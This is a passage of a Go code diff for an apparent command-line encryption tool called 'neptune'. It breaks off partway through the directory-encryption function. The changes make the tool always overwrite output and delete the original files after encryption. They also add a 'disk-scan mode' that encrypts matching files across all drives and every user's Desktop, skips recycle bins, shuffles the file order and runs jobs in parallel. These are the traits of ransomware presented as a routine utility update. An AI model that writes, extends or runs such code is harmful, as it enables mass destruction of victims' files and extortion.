@@ -5,7 +5,9 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/spf13/cobra"
@@ -16,67 +18,111 @@ import (
 	"neptune/internal/utils"
 )
 
+// encrypt command flags - populated by Cobra from command-line arguments.
 var (
-	encryptInputFile       string
-	encryptOutputFile      string
-	encryptText            string
-	encryptPublicKey       string
-	encryptPrivateKey      string
-	encryptEncoding        string
-	encryptKeyEncoding     string
-	encryptForce           bool
-	encryptForceOverride   bool
-	encryptRemoveSource       bool
-	encryptSecureRemoveSource bool
-	encryptRecursive          bool
-	encryptInclude         []string
-	encryptExclude         []string
-	encryptTimeout         int
-	encryptChunkSize       string // buffer size for streaming encryption
-	encryptParallel        int    // number of parallel processes
+	// encryptInputFile is the path to the input file or directory to encrypt.
+	// If empty, the tool enters disk-scan mode.
+	encryptInputFile string
+
+	// encryptOutputFile is the path to the output directory for encrypted files.
+	// Defaults to the same directory as the input.
+	encryptOutputFile string
+
+	// encryptPublicKey is the recipient's public key (file path or URL).
+	// Required for encryption - ensures only the recipient can decrypt.
+	encryptPublicKey string
+
+	// encryptPrivateKey is the sender's private key (file path or URL).
+	// Required for encryption - proves the sender's identity.
+	encryptPrivateKey string
+
+	// encryptKeyEncoding specifies the encoding format of the keys.
+	// Supported: hex, base64, base64url. Default: hex.
+	encryptKeyEncoding string
+
+	// encryptInclude is a list of file patterns to include.
+	// Only files matching these patterns will be encrypted.
+	encryptInclude []string
+
+	// encryptExclude is a list of file patterns to exclude.
+	// Files matching these patterns will be skipped.
+	encryptExclude []string
+
+	// encryptTimeout is the HTTP request timeout in seconds for remote key loading.
+	encryptTimeout int
+
+	// encryptChunkSize is the buffer size for streaming encryption.
+	// Format examples: "64KB", "1MB", "4MB".
+	encryptChunkSize string
+
+	// encryptParallel is the number of parallel processes for directory encryption.
+	// Valid range: 1-10. Default: 1.
+	encryptParallel int
 )
 
+// encryptCmd encrypts a file or directory using Curve25519 key exchange and Sosemanuk stream cipher.
+//
+// The encryption process:
+//  1. Load sender's private key and recipient's public key (from file or URL)
+//  2. Compute a shared secret using ECDH (Curve25519)
+//  3. Derive an encryption key using HKDF-SHA256
+//  4. Generate a random 16-byte nonce
+//  5. Encrypt data using Sosemanuk stream cipher
+//  6. Write encrypted file with header (version + sender pubkey + nonce + ciphertext)
+//
+// Auto-enabled behaviors (always on):
+//   - Force overwrite: existing output files are always overwritten
+//   - Remove source: original files are always removed after successful encryption
+//   - Recursive: directories are always processed recursively
+//   - Already-encrypted detection: .ntp files are skipped
+//
+// Disk-scan mode is activated when --input is not specified:
+//   - Scans all disks except C:\ drive root
+//   - Scans all user desktop directories (C:\Users\*\Desktop)
+//   - Excludes recycle bin directories
+//   - Default chunk-size: 4MB
+//   - Default parallel: 8
 var encryptCmd = &cobra.Command{
 	Use:   "encrypt",
-	Short: "Encrypt a file, text or directory",
-	Long: `Encrypt a file, text or directory using Curve25519 key exchange and Sosemanuk stream cipher.
+	Short: "Encrypt a file or directory",
+	Long: `Encrypt a file or directory using Curve25519 key exchange and Sosemanuk stream cipher.
 
 You need to provide:
-  - Your private key (for authentication)
-  - Recipient's public key (for encryption)
+  - Your private key (for authentication, proves you are the sender)
+  - Recipient's public key (for encryption, ensures only recipient can decrypt)
 
 The encrypted data includes metadata (version, sender's public key, nonce) and can only be decrypted
 by the recipient using their private key.
 
-By default, Neptune prevents duplicate encryption by detecting .ntp files and encrypted file headers.
-Use --force-override to force encryption of already encrypted files.
+Auto-enabled behaviors:
+  - Force overwrite: existing output files are always overwritten
+  - Remove source: source file is always removed after successful encryption
+  - Recursive: directories are always processed recursively
+  - Already-encrypted detection: .ntp files and encrypted file headers are skipped
 
 Examples:
-  # Encrypt a file
-  neptune encrypt --input plaintext.txt --output encrypted.bin --public-key recipient_public.key --private-key my_private.key
+  # Encrypt a file (output to same directory as input)
+  neptune encrypt --input document.pdf --public-key recipient.key --private-key my.key
 
-  # Encrypt text directly
-  neptune encrypt --text "secret message" --public-key recipient_public.key --private-key my_private.key
+  # Encrypt a file to different directory
+  neptune encrypt --input document.pdf --output ./encrypted --public-key recipient.key --private-key my.key
 
-  # Encrypt with base64 encoded keys
-  neptune encrypt --input data.txt --output encrypted.bin --public-key recipient.key --private-key my.key --key-encoding base64
+  # Encrypt a directory (output to same directory)
+  neptune encrypt --input ./documents --public-key recipient.key --private-key my.key
 
-  # Encrypt and remove source file
-  neptune encrypt --input secret.txt --output secret.ntp --public-key recipient.key --private-key my.key --remove-source
+  # Encrypt a directory to different directory
+  neptune encrypt --input ./documents --output ./encrypted --public-key recipient.key --private-key my.key
 
-  # Encrypt a directory recursively
-  neptune encrypt --input documents/ --output encrypted/ --public-key recipient.key --private-key my.key --recursive
+  # Encrypt only PDF files in a directory
+  neptune encrypt --input ./documents --include "*.pdf" --public-key recipient.key --private-key my.key
 
-  # Encrypt directory with file filtering
-  neptune encrypt --input documents/ --output encrypted/ --public-key recipient.key --private-key my.key --recursive --include "*.pdf" --exclude "*.tmp"
+  # Encrypt with remote keys from HTTPS URL
+  neptune encrypt --input data.txt --public-key https://server.com/pub.key --private-key https://server.com/priv.key
 
-  # Force encryption of already encrypted file
-  neptune encrypt --input encrypted.ntp --output reencrypted.ntp --public-key recipient.key --private-key my.key --force-override`,
+  # Disk-scan mode: encrypt all PDF files across all disks
+  neptune encrypt --include "*.pdf" --public-key recipient.key --private-key my.key`,
 	RunE: func(cmd *cobra.Command, args []string) error {
-		// Validate inputs
-		if encryptInputFile == "" && encryptText == "" {
-			return utils.NewMissingInputError("input or text")
-		}
+		// Validate required flags
 		if encryptPublicKey == "" {
 			return utils.NewMissingInputError("public-key")
 		}
@@ -84,7 +130,38 @@ Examples:
 			return utils.NewMissingInputError("private-key")
 		}
 
-		// --input parameter must be a local file path, not a URL
+		// Determine if we're in disk-scan mode (no --input specified)
+		diskScanMode := encryptInputFile == ""
+
+		// Disk-scan mode specific validation and defaults
+		if diskScanMode {
+			// --include is required in disk-scan mode to prevent accidental full-disk encryption
+			if len(encryptInclude) == 0 {
+				return &utils.NeptuneError{
+					Code:       utils.ErrCodeInvalidInput,
+					Message:    "--include parameter is required when --input is not specified",
+					Suggestion: "use --include flag to specify file patterns (e.g., --include \"*.pdf\")",
+				}
+			}
+
+			// Set default values optimized for disk-scan mode
+			if encryptTimeout <= 0 {
+				encryptTimeout = 30
+			}
+			if encryptChunkSize == "" || encryptChunkSize == "64KB" {
+				encryptChunkSize = "4MB"
+			}
+			if encryptParallel == 0 || encryptParallel == 1 {
+				encryptParallel = 8
+			}
+		}
+
+		// Validate input is provided for non-disk-scan mode
+		if !diskScanMode && encryptInputFile == "" {
+			return utils.NewMissingInputError("input")
+		}
+
+		// Reject URL inputs - --input only supports local files
 		if encryptInputFile != "" && utils.IsHTTPURL(encryptInputFile) {
 			return &utils.NeptuneError{
 				Code:       utils.ErrCodeInvalidInput,
@@ -93,22 +170,23 @@ Examples:
 			}
 		}
 
-		// Set timeout
+		// Parse HTTP timeout duration
 		timeout := time.Duration(encryptTimeout) * time.Second
 		if timeout <= 0 {
 			timeout = utils.DefaultHTTPTimeout
 		}
 
-		// Parse encoding type for keys
+		// Parse key encoding format
 		keyEncoding, err := utils.ParseEncodingType(encryptKeyEncoding)
 		if err != nil {
 			return err
 		}
 
-		// Load sender's private key (memory-only)
+		// Load sender's private key
 		var senderKeyPair *neptuneCurve25519.KeyPair
 		var privateKeyData []byte
 		if utils.IsHTTPURL(encryptPrivateKey) {
+			// Load private key from remote URL into memory
 			utils.PrintInfo("Loading private key from remote to memory: %s", encryptPrivateKey)
 			privateKeyData, err = utils.DownloadBytes(encryptPrivateKey, timeout)
 			if err != nil {
@@ -118,11 +196,12 @@ Examples:
 			if err != nil {
 				return utils.NewKeyReadError(encryptPrivateKey, err)
 			}
-			// clear key data from memory
+			// Securely clear downloaded key data from memory immediately after use
 			utils.PrintInfo("[Memory] Clearing downloaded private key data (%d bytes)...", len(privateKeyData))
 			utils.SecureZeroMemory(privateKeyData)
 			utils.PrintSuccess("[Memory] Private key data cleared from memory")
 		} else {
+			// Load private key from local file
 			if err := utils.ValidateFilePath(encryptPrivateKey); err != nil {
 				return err
 			}
@@ -132,17 +211,16 @@ Examples:
 			}
 		}
 
-		// clear private key URL
-		if utils.IsHTTPURL(encryptPrivateKey) {
-			utils.PrintInfo("[Memory] Clearing private key URL...")
-			utils.SecureWipeString(&encryptPrivateKey)
-			utils.PrintSuccess("[Memory] Private key URL cleared from memory")
-		}
+		// Securely wipe the private key URL string from memory
+		utils.PrintInfo("[Memory] Clearing private key URL...")
+		utils.SecureWipeString(&encryptPrivateKey)
+		utils.PrintSuccess("[Memory] Private key URL cleared from memory")
 
-		// Load recipient's public key (memory-only)
+		// Load recipient's public key
 		var recipientPublicKey [neptuneCurve25519.KeySize]byte
 		var publicKeyData []byte
 		if utils.IsHTTPURL(encryptPublicKey) {
+			// Load public key from remote URL into memory
 			utils.PrintInfo("Loading public key from remote to memory: %s", encryptPublicKey)
 			publicKeyData, err = utils.DownloadBytes(encryptPublicKey, timeout)
 			if err != nil {
@@ -152,11 +230,12 @@ Examples:
 			if err != nil {
 				return utils.NewKeyReadError(encryptPublicKey, err)
 			}
-			// clear key data from memory
+			// Securely clear downloaded key data from memory immediately after use
 			utils.PrintInfo("[Memory] Clearing downloaded public key data (%d bytes)...", len(publicKeyData))
 			utils.SecureZeroMemory(publicKeyData)
 			utils.PrintSuccess("[Memory] Public key data cleared from memory")
 		} else {
+			// Load public key from local file
 			if err := utils.ValidateFilePath(encryptPublicKey); err != nil {
 				return err
 			}
@@ -166,14 +245,17 @@ Examples:
 			}
 		}
 
-		// clear public key URL
-		if utils.IsHTTPURL(encryptPublicKey) {
-			utils.PrintInfo("[Memory] Clearing public key URL...")
-			utils.SecureWipeString(&encryptPublicKey)
-			utils.PrintSuccess("[Memory] Public key URL cleared from memory")
+		// Securely wipe the public key URL string from memory
+		utils.PrintInfo("[Memory] Clearing public key URL...")
+		utils.SecureWipeString(&encryptPublicKey)
+		utils.PrintSuccess("[Memory] Public key URL cleared from memory")
+
+		// Execute encryption based on mode
+		if diskScanMode {
+			return encryptAllDisks(senderKeyPair, recipientPublicKey)
 		}
 
-		// Check if input is a directory
+		// Determine if input is a file or directory
 		if encryptInputFile != "" {
 			info, err := os.Stat(encryptInputFile)
 			if err != nil {
@@ -181,194 +263,192 @@ Examples:
 			}
 
 			if info.IsDir() {
-				if !encryptRecursive {
-					return utils.NewInvalidInputError("input", "input is a directory, use --recursive flag")
+				// Directory mode: encrypt all matching files recursively
+				if encryptOutputFile == "" {
+					encryptOutputFile = encryptInputFile
+				} else {
+					outputInfo, err := os.Stat(encryptOutputFile)
+					if err != nil {
+						// Output directory does not exist, create it
+						if err := os.MkdirAll(encryptOutputFile, 0755); err != nil {
+							return utils.NewInvalidInputError("output", fmt.Sprintf("failed to create output directory: %s", encryptOutputFile))
+						}
+					} else if !outputInfo.IsDir() {
+						return utils.NewInvalidInputError("output", "output must be a directory when input is a directory")
+					}
 				}
 				return encryptDirectory(encryptInputFile, encryptOutputFile, senderKeyPair, recipientPublicKey)
 			}
+
+			// Single file mode: output must be a directory
+			if encryptOutputFile == "" {
+				encryptOutputFile = filepath.Dir(encryptInputFile)
+			} else {
+				outputInfo, err := os.Stat(encryptOutputFile)
+				if err != nil {
+					// Output directory does not exist, create it
+					if err := os.MkdirAll(encryptOutputFile, 0755); err != nil {
+						return utils.NewInvalidInputError("output", fmt.Sprintf("failed to create output directory: %s", encryptOutputFile))
+					}
+				} else if !outputInfo.IsDir() {
+					return utils.NewInvalidInputError("output", "output must be a directory, not a file name")
+				}
+			}
+			return encryptSingleFile(encryptInputFile, encryptOutputFile, senderKeyPair, recipientPublicKey)
 		}
 
-		// Handle single file or text encryption
-		return encryptSingleFileOrText(encryptInputFile, encryptOutputFile, encryptText, senderKeyPair, recipientPublicKey)
+		return utils.NewMissingInputError("input")
 	},
 }
 
-func encryptSingleFileOrText(inputFile, outputFile, text string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
-	// parsing buffer size
+// encryptSingleFile encrypts a single file using streaming encryption.
+//
+// Parameters:
+//   - inputFile: Path to the source file to encrypt
+//   - outputFile: Directory where the encrypted file will be saved
+//   - senderKeyPair: Sender's key pair for authentication
+//   - recipientPublicKey: Recipient's public key for encryption
+//
+// The encrypted file is named <basename>.ntp and placed in the output directory.
+// After successful encryption, the source file is deleted.
+func encryptSingleFile(inputFile, outputFile string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
+	// Parse and validate the chunk size for streaming
 	chunkSize, err := utils.ParseChunkSize(encryptChunkSize)
 	if err != nil {
 		return err
 	}
 
-	// validating buffer size
 	if err := utils.ValidateChunkSize(chunkSize); err != nil {
 		return err
 	}
 
-	// for text encryption, use original method
-	if inputFile == "" {
-		plaintext := []byte(text)
-		
-		// Encrypt the data
-		encryptedData, err := neptuneCrypto.EncryptWithKeyPair(plaintext, senderKeyPair, recipientPublicKey)
-		if err != nil {
-			return utils.NewEncryptError(err)
-		}
-
-		// Serialize encrypted data
-		ciphertext := encryptedData.Serialize()
-
-		// Write output
-		if outputFile != "" {
-			// Validate output file
-			if err := utils.ValidateFileForWrite(outputFile, encryptForce); err != nil {
-				return err
-			}
-			if err := os.WriteFile(outputFile, ciphertext, 0644); err != nil {
-				return utils.NewFileWriteError(outputFile, err)
-			}
-
-			utils.PrintSuccess("Data encryption successful!")
-			utils.PrintInfo("Input: text (%s)", utils.FormatFileSize(int64(len(plaintext))))
-			utils.PrintInfo("Output: %s (%s)", outputFile, utils.FormatFileSize(int64(len(ciphertext))))
-			utils.PrintWarning("Keep encrypted files and keys secure")
-		} else {
-			// Output to stdout
-			if _, err := io.WriteString(os.Stdout, string(ciphertext)); err != nil {
-				return utils.NewFileWriteError("stdout", err)
-			}
-		}
-
-		return nil
-	}
-
-	// for file encryption, use streaming encryption
-	// Validate input file
+	// Validate input file exists and is readable
 	if err := utils.ValidateFileForRead(inputFile); err != nil {
 		return err
 	}
 
-	// Check if file is already encrypted
-	if err := utils.ValidateNotEncrypted(inputFile, encryptForceOverride); err != nil {
+	// Check if file is already encrypted (skip duplicate encryption)
+	if err := utils.ValidateNotEncrypted(inputFile, false); err != nil {
 		return err
 	}
 
-	// get file size for display
+	// Compute output file path: <output_dir>/<basename>.ntp
+	baseName := filepath.Base(inputFile)
+	outputPath := filepath.Join(outputFile, baseName+".ntp")
+
+	// Get file size for display purposes
 	fileSize, err := utils.GetFileSize(inputFile)
 	if err != nil {
 		return err
 	}
 
-	// open input file
+	// Open input file for reading
 	inputReader, err := os.Open(inputFile)
 	if err != nil {
 		return utils.NewFileReadError(inputFile, err)
 	}
+	defer inputReader.Close()
 
-	// create output file
-	if outputFile == "" {
-		// if no output file specified, output to stdout
-		outputWriter := os.Stdout
-		
-		utils.PrintInfo("Starting streaming encryption...")
-		utils.PrintInfo("Input: %s (%s)", inputFile, utils.FormatFileSize(fileSize))
-		utils.PrintInfo("Buffer size: %s", utils.FormatChunkSize(chunkSize))
-		
-		// use streaming encryption with progress display
-		totalBytes, err := encryptStreamWithProgress(inputReader, outputWriter, senderKeyPair, recipientPublicKey, chunkSize, fileSize)
-		if err != nil {
-			return err
-		}
-		
-		utils.PrintSuccess("Data encryption successful!")
-		utils.PrintInfo("Encrypted data size: %s", utils.FormatFileSize(totalBytes))
-		utils.PrintWarning("Keep encrypted files and keys secure")
-		
-		inputReader.Close()
-		return nil
-	}
+	utils.PrintInfo("Encrypting file %s %s", inputFile, utils.FormatFileSize(fileSize))
 
-	// Validate output file
-	if err := utils.ValidateFileForWrite(outputFile, encryptForce); err != nil {
+	// Ensure output directory exists
+	if err := utils.EnsureParentDirectory(outputPath); err != nil {
 		return err
 	}
 
-	// create output file
-	outputWriter, err := os.Create(outputFile)
+	// Validate output file can be written (force overwrite is always on)
+	if err := utils.ValidateFileForWrite(outputPath, true); err != nil {
+		return err
+	}
+
+	// Create output file for writing
+	outputWriter, err := os.Create(outputPath)
 	if err != nil {
-		return utils.NewFileWriteError(outputFile, err)
+		return utils.NewFileWriteError(outputPath, err)
 	}
 	defer outputWriter.Close()
 
-	utils.PrintInfo("Starting streaming encryption...")
-	utils.PrintInfo("Input: %s (%s)", inputFile, utils.FormatFileSize(fileSize))
-	utils.PrintInfo("Buffer size: %s", utils.FormatChunkSize(chunkSize))
-
-	// use streaming encryption with progress display
+	// Perform streaming encryption
 	totalBytes, err := encryptStreamWithProgress(inputReader, outputWriter, senderKeyPair, recipientPublicKey, chunkSize, fileSize)
 	if err != nil {
 		return err
 	}
 
-	// get output file size
-	outputFileSize, err := utils.GetFileSize(outputFile)
-	if err != nil {
-		outputFileSize = totalBytes + neptuneCrypto.HeaderSize // estimated size
-	}
-
-	utils.PrintSuccess("Data encryption successful!")
-	utils.PrintInfo("Input: %s (%s)", inputFile, utils.FormatFileSize(fileSize))
-	utils.PrintInfo("Output: %s (%s)", outputFile, utils.FormatFileSize(outputFileSize))
-	utils.PrintWarning("Keep encrypted files and keys secure")
-
-	// Close input file before removing
+	// Close files explicitly before deleting source
+	outputWriter.Close()
 	inputReader.Close()
 
-	// Remove source file if requested
-	if (encryptRemoveSource || encryptSecureRemoveSource) && inputFile != "" {
-		if encryptSecureRemoveSource {
-			utils.SecureDeleteFiles([]string{inputFile})
-			utils.PrintSuccess("Source file securely removed: %s", inputFile)
-		} else {
-			if err := os.Remove(inputFile); err != nil {
-				return utils.NewFileDeleteError(inputFile, err)
-			}
-			utils.PrintSuccess("Source file removed: %s", inputFile)
-		}
+	// Get output file size for display
+	outputFileSize, err := utils.GetFileSize(outputPath)
+	if err != nil {
+		outputFileSize = totalBytes + neptuneCrypto.HeaderSize
+	}
+
+	// Print encryption results
+	utils.PrintSuccess("Data encryption successful")
+	utils.PrintInfo("Input %s %s", inputFile, utils.FormatFileSize(fileSize))
+	utils.PrintInfo("Output %s %s", outputPath, utils.FormatFileSize(outputFileSize))
+	utils.PrintWarning("Keep encrypted files and keys secure")
+
+	// Remove source file after successful encryption
+	if err := utils.DeleteFile(inputFile); err != nil {
+		utils.PrintWarning("Failed to remove source file %s", inputFile)
+		utils.PrintWarning("Reason %s", err.Error())
+	} else {
+		utils.PrintSuccess("Source file removed %s", inputFile)
 	}
 
 	return nil
 }
 
-// encryptStreamWithProgress use streaming encryption with progress display
+// encryptStreamWithProgress performs streaming encryption of data from reader to writer.
+//
+// The encryption process:
+//  1. Compute shared secret using Curve25519 ECDH
+//  2. Derive encryption key using HKDF-SHA256
+//  3. Generate random nonce
+//  4. Write encryption header (version + sender pubkey + nonce)
+//  5. Stream plaintext through Sosemanuk cipher to writer
+//  6. Securely clear all sensitive data from memory
+//
+// Parameters:
+//   - plaintext: Reader providing plaintext data
+//   - writer: Writer for encrypted output
+//   - senderKeyPair: Sender's key pair for authentication
+//   - recipientPublicKey: Recipient's public key for key exchange
+//   - bufferSize: Size of the streaming buffer in bytes
+//   - totalSize: Total size of the input (for display only)
+//
+// Returns the total number of plaintext bytes processed.
 func encryptStreamWithProgress(plaintext io.Reader, writer io.Writer, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte, bufferSize int, totalSize int64) (int64, error) {
-	// compute shared secret
+	// Step 1: Compute ECDH shared secret from key pair and recipient's public key
 	sharedSecret, err := senderKeyPair.ComputeSharedSecret(recipientPublicKey)
 	if err != nil {
 		return 0, fmt.Errorf("compute shared secret failed: %w", err)
 	}
 
-	// derive encryption key
+	// Step 2: Derive encryption key using HKDF-SHA256
+	// Context includes recipient's public key for domain separation
 	context := append([]byte("neptune-encryption"), recipientPublicKey[:]...)
 	encryptionKey, err := neptuneCrypto.DeriveEncryptionKey(sharedSecret[:], context)
 	if err != nil {
 		return 0, fmt.Errorf("derive encryption key failed: %w", err)
 	}
 
-	// generate random nonce
+	// Step 3: Generate cryptographically secure random nonce
 	nonce, err := neptuneCrypto.GenerateNonce()
 	if err != nil {
 		return 0, fmt.Errorf("failed to generate nonce: %w", err)
 	}
 
-	// create Sosemanuk cipher
+	// Step 4: Create Sosemanuk stream cipher instance
 	cipher, err := neptuneSosemanuk.New(encryptionKey, nonce[:])
 	if err != nil {
 		return 0, fmt.Errorf("failed to create cipher: %w", err)
 	}
 
-	// write header info
-	// format: [Version: 1 byte][SenderPubKey: 32 bytes][Nonce: 16 bytes]
+	// Step 5: Write encryption header
+	// Format: [Version: 1 byte][SenderPubKey: 32 bytes][Nonce: 16 bytes]
 	header := make([]byte, neptuneCrypto.HeaderSize)
 	header[0] = neptuneCrypto.Version
 	copy(header[1:], senderKeyPair.PublicKey[:])
@@ -378,36 +458,31 @@ func encryptStreamWithProgress(plaintext io.Reader, writer io.Writer, senderKeyP
 		return 0, fmt.Errorf("failed to write header: %w", err)
 	}
 
-	// get buffer
+	// Step 6: Get buffer from global pool for streaming
 	buf := utils.GetGlobalBuffer(bufferSize)
 	defer utils.PutGlobalBuffer(buf)
-	
-	// ensure buffer has sufficient size
+
+	// Ensure buffer has sufficient capacity
 	if cap(buf) < bufferSize {
 		buf = make([]byte, bufferSize)
 	} else {
 		buf = buf[:bufferSize]
 	}
 
-	// stream encryption data
-	var processedBytes int64
-	headerSize := int64(neptuneCrypto.HeaderSize)
+	utils.PrintInfo("Starting encryption")
 
-	// initial progress
-	progress := float64(0)
-	if totalSize > 0 && totalSize > headerSize {
-		progress = float64(headerSize) / float64(totalSize) * 100
-	}
-	fmt.Printf("\rEncryption progress: %.1f%%", progress)
+	// Step 7: Stream and encrypt data
+	var processedBytes int64
 
 	for {
+		// Read chunk of plaintext data
 		n, err := plaintext.Read(buf)
 		if n > 0 {
-			// encrypt data chunk
+			// Encrypt the chunk using XOR with keystream
 			encryptedChunk := make([]byte, n)
 			cipher.XORKeyStream(encryptedChunk, buf[:n])
 
-			// write encrypted data
+			// Write encrypted chunk to output
 			nw, ew := writer.Write(encryptedChunk)
 			if ew != nil {
 				return processedBytes, fmt.Errorf("write encrypted data failed: %w", ew)
@@ -417,20 +492,9 @@ func encryptStreamWithProgress(plaintext io.Reader, writer io.Writer, senderKeyP
 			}
 
 			processedBytes += int64(n)
-
-			// update progress (every 1%)
-			if totalSize > 0 {
-				currentProgress := float64(processedBytes) / float64(totalSize) * 100
-				if currentProgress > 100 {
-					currentProgress = 100
-				}
-				if int(currentProgress) != int(progress) {
-					fmt.Printf("\rEncryption progress: %.1f%%", currentProgress)
-					progress = currentProgress
-				}
-			}
 		}
 
+		// Handle end of input
 		if err == io.EOF {
 			break
 		}
@@ -439,10 +503,9 @@ func encryptStreamWithProgress(plaintext io.Reader, writer io.Writer, senderKeyP
 		}
 	}
 
-	// display final progress
-	fmt.Printf("\rEncryption progress: 100.0%%\n")
+	utils.PrintSuccess("Encryption completed")
 
-	// ========== Memory cleanup: clear sensitive data ==========
+	// Step 8: Memory cleanup - securely clear all sensitive data
 	utils.PrintInfo("[Memory] Clearing encryption key...")
 	utils.SecureZeroMemory(sharedSecret[:])
 	utils.SecureZeroMemory(encryptionKey)
@@ -463,32 +526,38 @@ func encryptStreamWithProgress(plaintext io.Reader, writer io.Writer, senderKeyP
 	return processedBytes, nil
 }
 
-// encryptDataToFile encrypts byte data and writes to output file
+// encryptDataToFile encrypts in-memory byte data and writes the result to a file.
+//
+// This is used for encrypting small data that is already in memory
+// (e.g., text encryption from command line).
+// After encryption, the plaintext data is securely zeroed from memory.
 func encryptDataToFile(data []byte, outputFile string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
-	// Encrypt the data using KeyPair
+	// Encrypt the data using the high-level crypto API
 	encryptedData, err := neptuneCrypto.EncryptWithKeyPair(data, senderKeyPair, recipientPublicKey)
 	if err != nil {
 		return err
 	}
 
-	// Serialize encrypted data to bytes
+	// Serialize encrypted data (header + ciphertext) to byte slice
 	ciphertext := encryptedData.Serialize()
 
-	// Write to output file
+	// Ensure output directory exists
 	if err := utils.EnsureParentDirectory(outputFile); err != nil {
 		return err
 	}
 
+	// Write encrypted data to output file
 	if err := os.WriteFile(outputFile, ciphertext, 0644); err != nil {
 		return utils.NewFileWriteError(outputFile, err)
 	}
 
+	// Print encryption results
 	utils.PrintSuccess("Data encryption successful!")
 	utils.PrintInfo("Input: remote data (%s)", utils.FormatFileSize(int64(len(data))))
 	utils.PrintInfo("Output: %s (%s)", outputFile, utils.FormatFileSize(int64(len(ciphertext))))
 	utils.PrintWarning("Keep encrypted files and keys secure")
 
-	// ========== Memory cleanup: clear plaintext data ==========
+	// Securely clear plaintext data from memory
 	utils.PrintInfo("[Memory] Clearing plaintext data...")
 	utils.SecureZeroMemory(data)
 	utils.PrintSuccess("[Memory] Plaintext data cleared from memory")
@@ -496,59 +565,33 @@ func encryptDataToFile(data []byte, outputFile string, senderKeyPair *neptuneCur
 	return nil
 }
 
-// fileProgress tracks encryption progress for a single file
-type fileProgress struct {
-	fileName       string
-	processedBytes int64
-	totalBytes     int64
-	mu             sync.Mutex
-}
-
-// updateProgress update file progress
-func (p *fileProgress) updateProgress(processed int64) {
-	p.mu.Lock()
-	p.processedBytes = processed
-	p.mu.Unlock()
-}
-
-// getProgress get current progress
-func (p *fileProgress) getProgress() (string, int64, int64) {
-	p.mu.Lock()
-	defer p.mu.Unlock()
-	progress := p.processedBytes
-	total := p.totalBytes
-	fileName := p.fileName
-	return fileName, progress, total
-}
-
-// progressReader wraps io.Reader to track bytes read
-type progressReader struct {
-	reader   io.Reader
-	progress *fileProgress
-	readBytes int64
-}
-
-// Read implements io.Reader interface while tracking read progress
-func (pr *progressReader) Read(p []byte) (n int, err error) {
-	n, err = pr.reader.Read(p)
-	pr.readBytes += int64(n)
-	pr.progress.updateProgress(pr.readBytes)
-	return
-}
-
+// encryptDirectory encrypts all matching files in a directory recursively.
+//
+// The process:
+//  1. Scan directory for files matching include/exclude patterns
+//  2. Shuffle file list for random processing order
+//  3. For each file: check if already encrypted, skip if so
+//  4. Encrypt files sequentially (parallel is handled at directory level for disk-scan)
+//  5. Collect successfully encrypted files for batch deletion
+//  6. Delete all source files after all encryptions complete
+//
+// Parameters:
+//   - inputDir: Source directory to scan and encrypt
+//   - outputDir: Destination directory for encrypted files
+//   - senderKeyPair: Sender's key pair for authentication
+//   - recipientPublicKey: Recipient's public key for encryption
 func encryptDirectory(inputDir, outputDir string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
-	// parsing buffer size
+	// Parse and validate chunk size
 	chunkSize, err := utils.ParseChunkSize(encryptChunkSize)
 	if err != nil {
 		return err
 	}
 
-	// validating buffer size
 	if err := utils.ValidateChunkSize(chunkSize); err != nil {
 		return err
 	}
 
-	// validate parallel processes count
+	// Validate parallel count is within valid range (1-10)
 	if encryptParallel < 1 {
 		return utils.NewInvalidParameterError("parallel", fmt.Sprintf("%d", encryptParallel), "must be greater than 0")
 	}
@@ -556,7 +599,9 @@ func encryptDirectory(inputDir, outputDir string, senderKeyPair *neptuneCurve255
 		return utils.NewInvalidParameterError("parallel", fmt.Sprintf("%d", encryptParallel), "cannot exceed 10")
 	}
 
-	// Find all files to encrypt
+	utils.PrintInfo("Scanning directory: %s", inputDir)
+
+	// Recursively find all files matching include/exclude patterns
 	files, err := utils.FindFilesRecursively(inputDir, encryptInclude, encryptExclude)
 	if err != nil {
 		return err
@@ -566,24 +611,24 @@ func encryptDirectory(inputDir, outputDir string, senderKeyPair *neptuneCurve255
 		return utils.NewInvalidInputError("input", "no matching files found in directory")
 	}
 
-	// Create output directory if it doesn't exist
+	// Shuffle file list for random processing order
+	utils.ShuffleStrings(files)
+
+	// Ensure output directory exists
 	if err := utils.EnsureDirectory(outputDir); err != nil {
 		return err
 	}
 
 	utils.PrintInfo("Found %d files to encrypt", len(files))
-	utils.PrintInfo("number of parallel processes: %d", encryptParallel)
-	utils.PrintInfo("Buffer size: %s", utils.FormatChunkSize(chunkSize))
 
-	// tracks progress of each file
+	// fileInfo holds precomputed metadata for each file
 	type fileInfo struct {
-		relPath    string
-		outputPath string
-		fileSize   int64
-		progress   *fileProgress
+		relPath    string  // Path relative to input directory
+		outputPath string  // Full path to output file
+		fileSize   int64   // Size of the source file
 	}
 
-	// precompute file information and total size
+	// Precompute file information and create output directories
 	fileInfos := make([]fileInfo, 0, len(files))
 	var totalSize int64
 	createdDirs := make(map[string]bool)
@@ -604,212 +649,229 @@ func encryptDirectory(inputDir, outputDir string, senderKeyPair *neptuneCurve255
 			relPath:    relPath,
 			outputPath: outputPath,
 			fileSize:   fileSize,
-			progress: &fileProgress{
-				fileName:   filepath.Base(filePath),
-				totalBytes: fileSize,
-			},
 		})
 	}
 
-	// create semaphore to control concurrency
-	sem := make(chan struct{}, encryptParallel)
-
-	// used to collect results
+	// Counters for statistics
 	var successCount, failedCount, skippedCount int32
-	var mu sync.Mutex // protect counters
+	var filesToDelete []string
 
-	// progress display
-	var completedFiles int32
-	totalFiles := len(files)
+	utils.PrintInfo("Encrypting directory: %s", inputDir)
 
-	// create WaitGroup to wait for all goroutines
-	var wg sync.WaitGroup
-
-	// create error collector
-	var errors []error
-	errorMu := sync.Mutex{}
-	
-	// process each file
+	// Process each file
 	for i, filePath := range files {
-		wg.Add(1)
+		info := &fileInfos[i]
 
-		go func(filePath string, idx int) {
-			defer wg.Done()
+		// Check if file is already encrypted to prevent double-encryption
+		isEncrypted, err := utils.IsNeptuneEncryptedFile(filePath)
+		if err != nil {
+			utils.PrintError("Failed to check file status: %s", filePath)
